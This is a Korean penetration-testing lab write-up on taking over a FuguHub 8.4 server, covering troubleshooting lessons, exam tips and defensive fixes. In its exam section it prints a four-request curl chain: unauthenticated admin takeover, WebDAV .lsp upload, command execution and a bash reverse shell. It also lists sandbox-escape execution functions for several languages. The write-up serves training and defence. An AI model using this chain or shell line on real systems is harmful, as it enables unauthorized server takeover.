`email4.txt`는 미끼다. base64 디코딩 결과가 이메일 주소일 뿐 아무 데도 안 쓰인다. 그래도 디코딩은 해봐야 한다 — `echo <문자열> | base64 -d`는 1초다. 미끼인지 아닌지는 열어보기 전에는 모르고, 판단 기준은 내용이 아니라 비용이다. 1초면 열고, 10분이면 다른 경로를 먼저 본다.

> [!tip] 시험 증거 형식 연습
> PG는 `proof.txt` 값만 제출하면 되지만 실제 시험은 스크린샷이 필요하고, 아래가 한 화면에 있어야 인정된다:
> ```bash
> whoami; hostname; ip a; cat /root/proof.txt
> ```
> 이 박스에서는 `id; hostname; cat /root/proof.txt`를 한 줄로 쳤다. **시험에서는 `ip a`(또는 `ip addr show`)를 반드시 포함한다** — 채점자가 대상 호스트임을 확인하는 근거다.
> 플래그를 잡은 직후, 셸을 잃기 전에 찍어라. 리버스셸은 언제든 끊긴다.

---

## 6. 막혔던 지점 / 시행착오

### ① 버전 판정 — 3중 근거가 3중으로 틀렸다 (실제로 겪음)

이 박스에서 실제로 시간을 태운 유일한 지점이다.

진행 순서는 이랬다:

```
80/tcp readme.txt 발견  →  "Changes for 8.0  July 2019"
                        →  SSL 인증서 Not valid before: 2019-07-16  (일치!)
                        →  8082 인덱스 Last-Modified: 2019-07-19    (일치!)
                        →  "8.0이 확실하다" 로 결론
                        →  8.0 대상 exploit 검색 · 리소스 해시 비교 시도
                        →  전부 헛수고
                        ↓
          인증 확보 후 /rtl/about.lsp  →  "FuguHub 8.4"
```

**무엇이 잘못됐나**: 근거를 *세었지* *검증하지* 않았다. 셋은 전부 2019년 배포 아카이브라는 단일 출처에서 나온 값이었고, 실행 중인 바이너리와는 아무 관계가 없었다.

**어떻게 알아챘나**: 관리자 계정을 선점한 뒤 인증이 필요한 경로가 열렸고, 거기서 앱이 런타임에 렌더한 About 페이지를 읽으면서 뒤집혔다.

가져갈 것은 두 갈래다.

1. 인식론적으로 — 일치하는 근거의 *개수*는 신뢰도가 아니다. 생성 경로가 서로 다른 근거만이 독립 증거다. (상세 절차는 [2-6](#2-6-버전-판정의-인식론--근거의-개수가-아니라-독립성))
2. 절차적으로 — 자격증명을 확보한 직후 가장 먼저 할 일이 About/버전 페이지 확인이다. 무인증 상태에서 내린 버전 판정은 전부 잠정으로 취급하고, 인증이 열리는 순간 재검증한다.
   `[가정 — 이 박스에서 `/rtl/about.lsp`에 인증이 필요했는지가 미확정이다.` 1장의 무인증 표면 표는 한때 이 경로를 무인증 200으로 적어놨고, 본문 네 곳은 인증 후 접근을 전제한다. 다수 근거를 따라 표를 정정했으나 타겟이 정지돼 재확인이 불가하다. 만약 무인증으로도 열렸다면 이 교훈은 인식론 문제가 아니라 단순 열거 누락이 된다]`
   **실전 순서는 무인증으로 About을 먼저 때려보고, 401이면 자격증명 확보 후 즉시 재시도하는 것이다.** 앞 단계를 건너뛰면 "인증이 필요했다"고 착각한 채 30분을 태울 수 있다.

리소스 해시로 버전을 가르려던 시도도 실패했다. favicon·로고를 8.0 배포본과 비교했는데 바이트 동일이었다. 실패라기보다 애초에 성립하지 않는 방법이었다 — 정적 리소스는 버전이 올라가도 안 바뀌는 것이 정상이다. 해시 비교는 "다르면 다르다"만 증명하고 "같으면 같다"는 증명하지 못한다. 이 비대칭을 알고 써야 한다.

### ② 랩 브리핑이 틀렸다 — 그런데 그게 문제가 아니었다 (실제로 겪음)

랩 문서는 이 박스를 8.1 / CVE-2023-24078로 안내한다. 실행 중인 버전은 8.4다.

그런데 이 절이 제시했던 "정답 CVE"도 틀렸다. 이 노트는 원래 여기서 *"CVE도 8.4 계열이면 CVE-2024-27697이 맞다"* 고 썼는데, 실제로 탄 경로(무인증 관리자 선점 + WebDAV `.lsp` 업로드 RCE)는 CVE-2023-24078 쪽이다. NVD 설명이 `/FuguHub/cmsdocs/` 컴포넌트를 통한 RCE라고 명시한다. CVE-2024-27697은 관리자 패널 About 페이지(`customize.lsp`)를 편집해 Lua를 주입하는 별개 취약점이고 `[가정 — NVD 미공개]`, 이 노트는 `customize.lsp`를 건드린 적이 없다. 랩 브리핑의 CVE 번호가 오히려 맞았고 틀린 것은 버전뿐이었던 셈이다.

*"실행 버전이 8.4니까 8.4용 CVE가 맞겠지"* 라는 추론이 그럴듯해서 벌어진 일이다. **버전 인접성은 취약점 동일성의 근거가 아니다.** 이 절의 원래 교훈인 "힌트를 사실로 취급하지 마라"는 그대로 유효하되, 그 잣대를 자기 자신에게도 대야 한다 — 남의 번호를 반박할 때 NVD description 한 문장을 읽어 컴포넌트가 내가 탄 경로와 같은지 확인하는 데 30초면 된다.

여기서 "CVE 번호가 안 맞으니 다른 취약점인가" 하고 흔들릴 수 있는데, 악용 체인은 동일했다:

```
/Config-Wizard/wizard/SetAdmin.lsp 무인증 → 관리자 선점 → WebDAV .lsp 업로드 → RCE
```

시험이든 랩이든 브리핑·힌트·CVE 번호는 출발점이지 사실이 아니다. CVE 번호가 안 맞으면 번호를 버리고 메커니즘으로 검색한다 — `FuguHub unauthenticated admin` 이나 `Barracuda web server lsp upload rce` 같은 식이다. 버전이 안 맞으면 인접 버전의 exploit도 읽어본다. 같은 코드베이스면 패치 안 된 경로가 남아 있다. 그리고 **exploit 코드는 실행하기 전에 읽어서 어떤 HTTP 요청을 보내는지부터 파악한다.** 그러면 버전이 달라도 손으로 이어갈 수 있다. 이 박스가 정확히 그 사례다 — 8.1용 exploit을 읽고 요청 4개로 환원했더니 8.4에서 그대로 통했다.

### ③ 9999 스캔 결과 50여 건이 통째로 위양성이었다 (실제로 겪음)

**BarracudaServer는 존재하지 않는 경로에도 302를 준다.** `/2009`, `/App_Data`, `/fileadmin`, `/downloader`, `/openx` … 전부 가짜였다.

**얼마나 걸렸나**: 스캔 시간 + 50여 개 경로를 하나씩 확인하는 시간. 전부 낭비였다.

**어떻게 알아챘나**: 아무 문자열이나 던져봤더니 그것도 302였다.

```bash
└─$ curl -s -o /dev/null -w "%{http_code}\n" http://192.168.248.25:9999/nonexistent-abc123
302
```

> [!tip] 웹 fuzz 전에 베이스라인부터 잰다 — 30초짜리 습관
> ```bash
> # 1. 존재할 리 없는 경로 3개로 서버의 "없음" 응답을 확정
> for p in nonexistent-abc123 zzz-$RANDOM .well-known/zzz; do
>   curl -s -o /dev/null -w "%{http_code} %{size_download} $p\n" "http://TARGET:PORT/$p"
> done
> ```
> 결과에 따라 필터를 정한다:
> - 전부 302 → `-C 302` (feroxbuster) / `-b 302` 제외 (gobuster)
> - 전부 200인데 길이가 같음 → 길이로 필터. `--filter-size <n>` / `-fs <n>` (ffuf)
> - 전부 404 → 정상. 필터 불필요
> - 경로마다 길이가 다름(경로 문자열을 에코) → 길이 필터가 안 먹는다. 정규식으로 본문 필터 (`ffuf -fr`)
>
> 이 30초가 이 박스에서 수십 분을 아꼈을 것이다.

### ④ `io.popen`이 죽어 있었다 (실제로 겪음)

교과서적 Lua 웹셸이 그대로 실패했다. `io.popen`이 nil이라 호출 단계에서 죽었다(표준 Lua 문구는 `attempt to call a nil value (field 'popen')`. 이 노트가 원래 인용했던 `field 'popen' is not callable`은 Lua 코어에 없는 문자열이라 삭제했다. 2-5 참조).

**어떻게 넘어갔나**: `pcall`로 감싸 에러 메시지를 응답 본문에 노출시키고, 제품 고유 API인 `ba.exec()`를 시도했다.

이 단계에서 중요한 판단은 "샌드박스니까 안 되겠다"로 끝내지 않은 것이다. **표준 라이브러리가 잘린 것은 오히려 제품 확장 API는 안 잘렸을 것이라는 신호였다.**

실행 함수가 막혔을 때의 후보 사다리를 언어별로 적어둔다.

| 언어 | 1순위 | 막혔을 때 후보 |
|---|---|---|
| Lua/LSP | `io.popen` | `os.execute` · `ba.exec`(Barracuda) · `require("os")` 재획득 · `load()`로 동적 평가 |
| PHP | `system` | `exec` `shell_exec` `passthru` `popen` `proc_open` `` ` `` `preg_replace /e` · `disable_functions` 우회 |
| Python | `os.system` | `subprocess.*` · `os.popen` · `__import__('os')` · `eval`/`exec` |
| Java/JSP | `Runtime.exec` | `ProcessBuilder` · `ScriptEngine` |
| Node | `child_process.exec` | `execSync` `spawn` · `process.binding` |

어느 언어든 절차는 같다. 예외를 잡아 응답에 노출시키고, 후보를 목록으로 순회하고, 살아 있는 것을 쓴다.

### ⑤ 80/tcp를 403이라고 버릴 뻔했다 (실제로 겪음)

nmap이 `http-title: 403 Forbidden`을 뱉었다. 그런데 그 뒤에 설치 디렉터리가 통째로 있었다 — `bdd.conf`(설치 경로·포트), `user.dat`, `Config-Wizard.zip`, `readme.txt`.

**놓칠 뻔한 이유**: 루트가 403이면 "인덱싱 금지 = 볼 것 없음"으로 반사적으로 넘어가게 된다. **실제로는 autoindex만 꺼졌고 파일은 서빙됐다.** 게다가 `/data`·`/themes`·`/applications`·`/disk`는 301(후행 슬래시 리다이렉트)로 응답했다 — 이 디렉터리들이 실재한다는 확정까지 로그에 찍혀 있었던 셈이다(1장 참조).

> [!warning] 확장자 목록이 좁았던 것은 맞다 — 그런데 그것만으로는 설명이 안 된다
> 1차 feroxbuster를 `-x php,txt,html,lsp`로 돌렸고 `conf`도 `dat`도 없었다. 여기까지는 사실이다. 문제는 2차 스캔도 못 찾았다는 것이다. `~/PG/Hub/ferox_80_files.log`를 보면 `-x conf,dat,zip,log,bak,txt`로 제대로 돌렸는데 결과가 `/`(403)·`/LICENSE.txt`·`/readme.txt` 세 줄뿐이다.
>
> 진짜 원인은 워드리스트다. `raft-medium-files.txt`에 `bdd`도 `user.dat`도 없다(전수 grep 0건). 기저 단어가 없으면 확장자를 아무리 붙여도 요청 자체가 만들어지지 않는다.
>
> ⚠️ 그러므로 "확장자를 넓혀 다시 긁어서야 나왔다"는 이 노트의 서술은 산출물이 뒷받침하지 않는다. `bdd.conf`·`user.dat`이 실재하고 크기도 맞는 것은 확실하지만(로컬 보존), 어떻게 그 이름을 알았는지의 기록이 없다. `[가정 — 제품 지식이나 `/applications/Config-Wizard.zip`에서 왔을 가능성이 높다]`
>
> 여기서 가져갈 것이 둘이다. 하나는 브루트포스 실패가 "확장자 부족"과 "워드리스트 부족"으로 나뉜다는 것 — 후자는 `-x`로 안 풀리고 제품 지식·배포 아카이브·벤더 문서로 가야 한다. 다른 하나는 **파일을 손에 넣었으면 어떻게 찾았는지를 그 자리에서 적으라**는 것이다. 나중에 재구성하면 가장 그럴듯한 경로(= 재스캔)로 채워 넣게 된다.
>
> 아래 2단 스캔은 일반 습관으로는 여전히 옳다(다른 박스에서 실제로 작동한다). 재발 방지:
> ```bash
> # 1차 — 빠르게, 언어 확장자
> feroxbuster -u http://T/ -w raft-medium-directories.txt -x php,html,lsp -C 302
> # 2차 — 설정·데이터 확장자로 다시 (여기가 정보 유출의 서식지)
> feroxbuster -u http://T/ -w raft-medium-files.txt \
>   -x conf,cfg,ini,env,json,yml,yaml,xml,dat,db,sql,bak,old,zip,log -C 302
> ```
> `json`을 특히 잊지 마라 — `composer.json`·`package.json`·`config.json`은 버전 판정 2순위 근거의 주 서식지다. 이 박스는 그 계층이 없어서(C 바이너리 제품) 버전 판정이 유독 어려웠다.

### ⑥ `user.dat`을 크랙하려던 시도 (실제로 겪음 — 막다른 길)

80/tcp에서 FuguHub의 사용자 DB인 `user.dat`(467바이트)이 그대로 다운로드됐다. "여기서 관리자 해시를 뽑아 크랙하면 되겠다"는 것이 자연스러운 다음 수였다.

막혔다. 다만 어디서 어떻게 막혔는지를 정확히 복원해둘 필요가 있다 — 이 노트는 원래 *"구조를 알 수 없는 바이너리 → 즉시 손절 … 이 박스는 세 번째였다"* 라고 적어놨는데, 파일을 실제로 열어보면 바이너리가 아니다.

```bash
┌──(kali㉿kali)-[~/PG/Hub]
└─$ file user.dat; wc -c user.dat
user.dat: JSON text data
467 user.dat

┌──(kali㉿kali)-[~/PG/Hub]
└─$ cat user.dat
{"v":"FNW5DJWHcKEa0LlHmUZiKyeLWdU432yDav00yzU9qamEHEAdK6OZ38rlCHbefsuXVAsIzhTRH90h8WM2CUoZdx\/ZiDYVNVHDu0u4vyv5bT9UDPr6zdOIIdS3sjpdpBclyWo+…"}
```

순수 ASCII JSON이고, 키 하나(`v`)에 base64 덩어리 하나가 들어 있다. 아래 판정 기준으로는 두 번째 범주(`base64/hex 덩어리 → 디코드해서 다시 판정`)다.

그래서 실제 관측 순서는 이랬다:

| # | 관측 | 판정 |
|---|---|---|
| 1 | `file` → `JSON text data`, 467바이트 | 바이너리가 아니다. 읽을 수 있다 |
| 2 | `cat` → `{"v":"<base64 한 덩어리>"}` | 두 번째 범주. 디코드해서 다시 판정한다 |
| 3 | base64 디코드 | 알려진 해시 접두사(`$1$`·`$5$`·`$6$`·`$2y$`·`$apr1$`)가 하나도 없는 불투명 blob |
| 4 | → 여기서 세 번째 범주로 귀결 | 제품 고유 포맷. `john`·`hashcat`에 넣을 모드 자체가 없다 → 손절 |

두 번째로 시작해 세 번째로 귀결된 것이다. 한 단계를 건너뛰고 "바이너리라서 손절"로 요약해버리면, 다음 박스에서 JSON 껍데기를 보고도 "구조를 모르겠다"며 디코드를 안 해보게 된다.

**어떻게 알아챘나**: base64를 풀어 알려진 해시 접두사가 하나도 없다는 것을 확인한 순간. 크랙을 시작하기 전이었다.

"제품 고유 암호화 포맷"이라는 결론은 맞았다. 틀린 것은 거기에 도달한 경로의 기록이고, `file`·`xxd`를 실제로 돌렸다면 나올 수 없는 서술이었다. 결론이 맞으면 과정 기술의 오류는 잘 눈에 띄지 않아서 위험하다. 학습 자료에서 값어치가 있는 것은 결론이 아니라 어떤 관측을 보고 어떻게 분기했는가인데, 그 부분이 통째로 잘못 적혀 있었다. **판정 단계를 쓸 때는 "이 박스가 몇 번이었나"를 기억이 아니라 파일을 다시 열어서 적어라.**

> [!warning] 크리덴셜 파일을 얻었을 때의 손절 판단 — 30초 안에 끝난다
> ```bash
> file user.dat && wc -c user.dat && strings -n 6 user.dat | head -20
> grep -aoE '\$[0-9a-z]{1,6}\$[^:]{8,}' user.dat        # 알려진 해시 접두사
> xxd user.dat | head -5                                 # 매직 바이트 / 구조
> ```
> 판정은 셋으로 갈린다. 알려진 해시 형식이 보이면 `hashid`/`hash-identifier`로 모드를 확정하고 크랙에 들어간다. base64/hex 덩어리면 디코드해서 다시 판정한다(앞이나 뒤 범주로 재분류된다). 구조를 알 수 없는 바이너리/blob이면 즉시 손절이다 — 제품 고유 포맷은 소스나 리버싱 없이는 못 푼다.
>
> 이 박스는 둘째로 시작해 셋째로 귀결됐다. 둘째는 종착지가 아니라 경유지라 반드시 한 번 더 판정해야 한다. 여기서 "그래도 혹시" 하며 hashcat 모드를 하나씩 돌려봤다면 시간을 통째로 날렸을 것이다. 그리고 `file`이 `JSON text data`를 뱉은 시점에 이미 둘째 범주가 확정된다. `file` 한 줄이 3초, 전체 판정이 30초다.

그런데 버린 것은 아니다. 이 파일은 두 가지로 여전히 유용했다:

1. **설치 경로 확정** — `user.dat`이 80에서 읽힌다는 사실 자체가 nginx 문서 루트 = `/var/www/html` = FuguHub 설치 디렉터리임을 확증한다.
2. **회수 채널** — 셸을 잡은 뒤 `/var/www/html/`에 파일을 떨구면 80/tcp로 그냥 다운로드된다. 아웃바운드가 막힌 환경에서 데이터를 빼내는 경로가 된다.

크랙이 안 되는 것과 쓸모가 없는 것은 다르다. 크리덴셜 파일이 안 풀리더라도 경로 정보, 사용자명 목록, 그리고 그 파일이 읽힌다는 사실이 함의하는 접근 범위는 남는다. 마지막 것이 특히 중요하다 — **이 경로의 파일이 웹으로 읽힌다는 것은 곧 이 경로에 쓸 수 있으면 웹으로 회수된다는 뜻**이고, 업로드 RCE와 데이터 반출 양쪽의 전제가 된다.

### ⑦ 이 유형에서 흔히 막히는 지점 (원문에 실측 기록 없음 — 일반 사례)

아래는 이 박스에서 실제로 겪은 것이 아니라 같은 유형에서 반복적으로 보고되는 함정이다. 구분해서 읽을 것.

| 증상 | 원인 | 대처 |
|---|---|---|
| `SetAdmin.lsp`가 `User database already saved`를 반환 | 이미 누가 선점했거나 관리자가 설정을 마침 | 이 경로는 죽었다. `user.dat` 삭제에는 셸이 필요하므로 다른 진입점을 찾아야 한다 |
| 업로드는 `201`인데 GET하면 소스가 그대로 보임 | 업로드 경로로 GET했다 (`/fs/x.lsp`) | 웹 루트 경로(`/x.lsp`)로 요청 |
| 업로드는 되는데 어느 경로로도 안 보임 | WebDAV 공유 루트가 웹 루트 밖 | 공유 루트 경로를 찾는다. 여기서는 `bdd.conf`의 `drivedir=` 가 그 단서 |
| 확장자를 `.lsp`로 올렸는데 실행 안 됨 | 해당 디렉터리에 스크립트 실행이 비활성 | 다른 디렉터리로 옮겨본다(`MOVE` 메서드). 또는 실행되는 디렉터리를 실행 파일 하나로 탐지 |
| `PUT`이 `403`/`405` | WebDAV가 읽기 전용이거나 realm이 다름 | `OPTIONS`를 그 경로에 다시 걸어 확인. 루트의 `Allow`와 하위 경로의 `Allow`가 다를 수 있다 |
| `c=id`는 되는데 리버스셸이 안 붙음 | `-d`로 보내 `0>&1`의 `&`에서 잘림 | `--data-urlencode` 사용 |
| 명령을 넣으면 HTTP가 영영 안 끝남 | 셸 프로세스를 부모가 기다림 | `setsid ... &` |

### ⑧ 시간 배분 — 어디서 손절했어야 하는가

| 단계 | 실제 소요감 | 적정선 | 판단 |
|---|---|---|---|
| nmap `-p-` | ~3분 | ~3분 | 적정. `--min-rate 5000`이 정답 |
| 버전 판정 | 길었다 | 10분 | ❌ 여기가 유일한 낭비. 3중 근거에 만족한 것이 원인 |
| 9999 fuzz + 위양성 확인 | 길었다 | 0분 | ❌ 베이스라인 30초면 통째로 회피 가능 |
| 무인증 표면 열거 | 짧음 | ~10분 | ✅ 여기서 `/Config-Wizard/`가 나왔다 |
| 관리자 선점 → RCE → root | 짧음 | ~10분 | ✅ 체인 자체는 4요청 |

손절 규칙은 한 줄로 요약된다. **버전을 못 맞혀도 표면 열거는 된다.** 버전 판정에 10분 이상 쓰고 있다면 즉시 중단하고 무인증 경로 열거로 전환한다. 이 박스의 정답 경로는 버전을 몰라도 `/Config-Wizard/` 302 하나로 찾을 수 있었다. 마찬가지로 fuzz 결과가 수십 건 쏟아지면 그건 발견이 아니라 위양성 신호다. 하나씩 확인하기 전에 베이스라인부터 잰다.

---

## 7. OSCP 시험 관점

1. **버전 증거에는 신뢰 순위가 있다.** 앱이 렌더하는 About 페이지 > 서버/API 버전 필드 > 패키지 메타데이터 > 정적 changelog·readme. 이 박스는 `readme.txt`(8.0) + SSL 인증서 날짜 + `Last-Modified`가 3중으로 일치하며 틀렸다. 증거가 여러 개 일치해도 출처가 같으면(2019년 배포본 잔존물) 독립 증거가 아니다.

2. **독립성 검사를 30초 절차로 반사화한다.** 각 근거에 대해 ① *누가 언제 만든 값인가*(빌드 시점 = 정적 / 요청 시점 = 동적) ② *같은 아카이브에서 나왔나* ③ *업그레이드 때 갱신되나*. 셋 다 통과한 근거만 센다.

3. **"설정 마법사 미완료" 배너 = 즉시 공격 대상.** 초기 설정이 안 끝난 어플라이언스는 관리자 계정을 공격자가 선점할 수 있다. FuguHub·NAS·공유기 관리페이지·Jenkins·GitLab에서 반복되는 패턴이고, 선착순이라 발견 즉시 잡아야 한다. 정찰을 마저 하고 돌아오면 사라질 수 있는 유일한 종류의 표면이다.

4. **`403 Forbidden`은 "볼 것 없음"이 아니다.** 인덱싱만 꺼졌을 뿐 파일은 서빙된다. 여기서는 80이 설치 디렉터리를 그대로 노출했다.

5. **확장자 목록을 2단으로 돌린다.** 1차는 언어 확장자(`php,html,jsp,aspx,lsp`)로 빠르게, 2차는 설정·데이터 확장자(`conf,cfg,ini,env,json,yml,xml,dat,db,sql,bak,old,zip,log`)로 다시.
   - ⚠️ 그런데 2차도 비면 확장자가 아니라 워드리스트를 의심한다. 이 박스의 `bdd.conf`·`user.dat`은 확장자를 넓힌 2차 스캔에서도 안 나왔다 — `raft-medium-files.txt`에 그 파일명 자체가 없기 때문이다. 기저 단어가 없으면 `-x`는 아무 요청도 만들지 않는다.
   - 브루트포스로 안 나오는 파일명은 제품 지식에서 온다 — 벤더 문서, 배포 아카이브(이 박스는 `/applications/Config-Wizard.zip`이 통째로 받아진다), GitHub 소스. 제품이 특정되면 브루트포스의 우선순위는 내려간다.

6. **스캐너 위양성을 먼저 거른다.** 존재할 리 없는 경로를 한 번 때려 서버의 "없음" 응답 코드를 확정하고 필터한다(`-C 302` / `-fs <길이>`). 9999 결과 50여 건이 통째로 가짜였다.

7. **401 realm 문자열은 접근제어 지도다.** `WWW-Authenticate: Basic realm="..."` 값이 갈리면 디렉터리별 인증 구성이 다르다는 뜻이다. realm 목록에 없는 경로가 무인증 표면이다.

8. **⚠️ Metasploit 한 장을 여기 쓰지 말고 4줄로 끝낸다.** 이 유형은 Metasploit 모듈로도 유통되지만 MSF는 시험 전체에서 1대 한정이다. Fundamental 난이도 박스에 그 한 장을 쓸 이유가 없다. 수동 대안:
   ```bash
   curl -s -X POST 'http://T:8082/Config-Wizard/wizard/SetAdmin.lsp' -d 'email=a@b.c&user=admin&password=password'
   curl -s -u admin:password -T shell.lsp http://T:8082/fs/shell.lsp
   curl -s -u admin:password --data-urlencode 'c=id' http://T:8082/shell.lsp
   curl -s -u admin:password --data-urlencode 'c=setsid bash -c "bash -i >& /dev/tcp/LHOST/LPORT 0>&1" &' http://T:8082/shell.lsp
   ```
   공개 exploit을 만나면 읽어서 HTTP 요청 몇 개로 환원하는 습관을 들인다. 그러면 버전이 달라도 손으로 이어갈 수 있다.

9. **업로드 RCE는 5단계로 쪼개 검증한다.** ① 업로드 201/204 ② GET으로 회수 ③ 무해한 산술식(`7*7`→`49`)으로 서버측 실행 확인 ④ `id` ⑤ 리버스셸. 한 번에 리버스셸부터 던지면 실패 원인이 5개 가설로 흩어진다.

10. **업로드 경로 ≠ 서빙 경로.** `PUT /fs/x.lsp` 로 올리고 `GET /x.lsp`(웹 루트 경로)로 요청해야 실행된다 — 이 박스에서 확인한 것은 이 조합이다. `GET /fs/x.lsp`가 무엇을 주는지는 때려본 기록이 없다 `[가정 — 파일 매니저가 소스를 반환할 가능성이 높다]`. 업로드한 경로 그대로 GET해서 "실행 안 됨"이라고 결론 내리기 전에 다른 경로로도 요청해본다.

11. **샌드박스는 벽이 아니라 체다.** `io.popen` 차단 → `ba.exec()`. `pcall`(또는 각 언어의 예외 처리)로 에러를 HTTP 본문에 노출시키고, 후보 함수를 목록으로 순회해 살아 있는 것을 찾는다. 표준 라이브러리가 잘렸다는 것은 제품 확장 API가 안 잘렸다는 힌트다.

12. **`-d` 대신 `--data-urlencode`.** 페이로드에 `&`·공백·`>`·`'`가 들어가면 `-d`는 `&` 지점에서 잘린다. 리버스셸 `0>&1`이 정확히 여기 걸린다. "명령은 되는데 셸이 안 붙는다"의 1순위 용의자.

13. **`setsid ... &`로 셸을 분리한다.** 안 하면 HTTP 응답이 영영 안 돌아와 "익스가 멈춘 것처럼" 보인다. ([[Crane]])

14. **`User=root`로 도는 서비스는 그 자체가 privesc.** 셸 잡자마자 `id`부터. 이미 root면 그 뒤 열거(SUID·capability·cron)는 전부 낭비다. `systemctl cat <서비스>` 로 `User=` 줄을 확인하는 습관도 함께.

15. **리버스셸이 안 붙을 때 점검 순서**: ① `c=id`로 RCE 자체 재확인 ② `--data-urlencode` 여부 ③ 아웃바운드 포트(443·80·53) ④ `bash` 존재 여부 ⑤ 리스너 확인 ⑥ `tun0` IP를 썼는가.

16. **`python3`가 없으면 `script -qc /bin/bash /dev/null`.** Debian은 대개 있지만 Arch·Alpine·최소 설치에는 없다. ([[Hawat]])

17. **랩 브리핑·CVE 번호를 사실로 취급하지 않는다 — 그리고 그 잣대를 자기 자신에게도 댄다.** 이 박스는 브리핑이 8.1, 실행 버전이 8.4였다. 그런데 "그럼 8.4용 CVE-2024-27697이 맞겠지"라고 이 노트가 붙인 대체 번호가 또 틀렸다 — 실제로 탄 것은 브리핑이 안내한 CVE-2023-24078 쪽이었다.
    - 버전 인접성은 취약점 동일성의 근거가 아니다. 확인 비용은 NVD description 한 문장, 30초다 — *어느 컴포넌트인가*가 내가 탄 경로와 같은지만 보면 된다.
    - CVE 번호가 아니라 메커니즘으로 검색한다. 시험에는 그 CVE가 안 나오고 같은 유형이 나온다. 이 박스는 번호를 두 번 틀리는 동안에도 체인이 계속 통했다.

---

## 8. 방어 관점

| 결함 | 왜 위험한가 | 조치 |
|---|---|---|
| 설정 마법사가 네트워크 전체에 무인증 노출 | 관리자 계정을 누구든 선점 → 전 권한 장악 | 설정 완료 전까지 `127.0.0.1` 바인딩 또는 디스크의 설치 토큰 요구(Jenkins 방식). 부팅 후 시간 창 제한도 유효 |
| 설정 상태를 파일 존재 여부로만 판단 | 상태를 공격자가 먼저 확정시킬 수 있다 | 설치 토큰·서명된 부트스트랩 값 등 공격자가 만들 수 없는 근거로 판정 |
| WebDAV 공유 루트 = 웹 루트 | 업로드가 곧 서버측 코드 실행 | 공유 루트를 웹 루트 밖으로 분리. 업로드 디렉터리에서 스크립트 실행 비활성 |
| 업로드 확장자·MIME 필터 부재 | `.lsp` 그대로 실행 | 실행 가능 확장자 거부 화이트리스트 + 저장 시 확장자 강제 변경 |
| `fuguhub.service`의 `User=root` | 앱 레벨 RCE가 곧바로 시스템 장악 | 전용 비특권 계정으로 구동. `systemd`의 `User=`·`ProtectSystem=strict`·`NoNewPrivileges=yes`·`PrivateTmp=yes` 적용. **이 한 줄만 고쳤어도 root RCE가 아니라 서비스 계정 RCE에 그쳤다** |
| Lua 샌드박스에서 `ba.exec`가 살아 있음 | `io.popen`을 지운 의미가 없어진다 | 사용자 업로드 스크립트에는 명령 실행 계열 API 전부 차단. 표준 라이브러리뿐 아니라 제품 확장 API를 함께 감사 |
| 80/tcp nginx가 설치 디렉터리를 그대로 서빙 | `bdd.conf`(경로·포트) · `user.dat`(사용자 DB) · `Config-Wizard.zip`(소스) 유출 | 문서 루트를 앱 설치 경로와 분리. 최소한 `.conf`·`.dat`·`.zip`·`.txt`를 거부 규칙으로 차단하고 autoindex 외에 파일 접근 자체를 제한 |
| 애플리케이션 아카이브(`Config-Wizard.zip`) 공개 | 폼 필드·검증 로직이 통째로 노출 | 배포 아티팩트를 웹 루트에 두지 않는다 |
| 존재하지 않는 경로에 302 반환 | 열거를 방해하는 듯 보이나 실익 없음 | 정확한 404를 반환. 위양성은 방어가 아니라 자기 로그를 오염시킬 뿐 |
| 관리자 계정에 약한 비밀번호 허용 | `password`가 그대로 통과 | 최소 길이·복잡도 정책, 최초 로그인 시 변경 강제 |

---

## 9. 참고 자료

- **CVE-2023-24078** — FuguHub 8.1 인증 우회 → RCE (랩 브리핑이 안내한 번호)
  - Exploit-DB 51550
  - NVD: https://nvd.nist.gov/vuln/detail/CVE-2023-24078 — *"Real Time Logic FuguHub v8.1 and earlier … RCE via the component /FuguHub/cmsdocs/"* (CVSS 3.1 8.8 HIGH, CWE-94)
  - ✅ 이 노트가 실제로 탄 경로가 이쪽이다. 랩 브리핑의 번호가 맞았고, 틀린 것은 버전(8.1 vs 8.4)뿐이었다
- **CVE-2024-27697** — 이 노트의 경로와 무관한 별개 취약점. FuguHub 8.4의 관리자 패널 About 페이지(`customize.lsp`)가 편집 가능한 Lua 페이지라는 점을 악용한다 `[가정 — NVD REST API 조회 결과 `totalResults: 0`(미공개/보류)이며, 위 설명은 공개 PoC 기준]`
  - 공개 PoC조차 *"계정 생성/인증에는 CVE-2023-24078을 leverage 하고 그 다음 `customize.lsp`"* 라고 두 CVE를 구분해서 쓴다
  - ⚠️ 이 노트는 한때 이 번호를 "실제 실행 버전에 대응하는 CVE"로 단정했다. 반증됨 — 1장·6장 ② 참조
- FuguHub / Barracuda Application Server (Real Time Logic) — LSP(Lua Server Pages), `ba.*` 런타임 API
- WebDAV 메서드: RFC 4918 (`PROPFIND` · `MKCOL` · `MOVE` · `COPY` · `LOCK`)
- HTTP Basic 인증과 realm: RFC 7617
- `systemd` 서비스 하드닝: `User=` · `NoNewPrivileges=` · `ProtectSystem=` · `PrivateTmp=`
- TTY 업그레이드 대안: `script -qc /bin/bash /dev/null`

---

## 남긴 흔적 (랩 정리용)

`/var/www/html/`에 `t1.lsp`, `en.lsp`, `sh9.lsp`, `x.lsp` 업로드됨. 관리자 계정 `admin:password` 및 `/var/www/html/user.dat` 생성됨. 랩 Stop/Revert 시 전부 소멸.

실전이라면 이 흔적이 문제가 된다. 업로드한 `.lsp` 4개는 누구나 접근 가능한 웹 루트에 있고, 인증도 안 걸려 있다면 제3자가 그대로 쓸 수 있는 백도어다. `user.dat` 생성은 되돌릴 수 없어서 원 관리자가 설정 마법사를 열면 "이미 저장됨"을 보게 된다 — 탐지 신호다. 실무 침투 테스트라면 보고서에 **생성한 계정과 업로드한 파일 목록**을 명시하고 정리 절차를 함께 제공해야 한다.

획득 자격증명: FuguHub `admin` / `password` (직접 생성). `/root/proof.txt` = `702262325fd3a55a2f23d49e0256571c`.

## 관련 노트

- [[_WRITEUP-STANDARD]] — 이 노트의 작성 기준
- [[Hawat]] — 웹서버가 root로 구동되어 권한상승이 없던 동일 패턴
- [[Crane]] — 직전 박스, 같은 컬렉션. "응답이 성공을 뜻하지 않는다" · `setsid`로 익스 멈춤 회피
- [[Levram]] · [[RubyDome]] · [[Astronaut]] — "버전 판정은 독립 근거 2개" 패턴 색인
- [[01. Pentest Foundations]] — Hub 항목
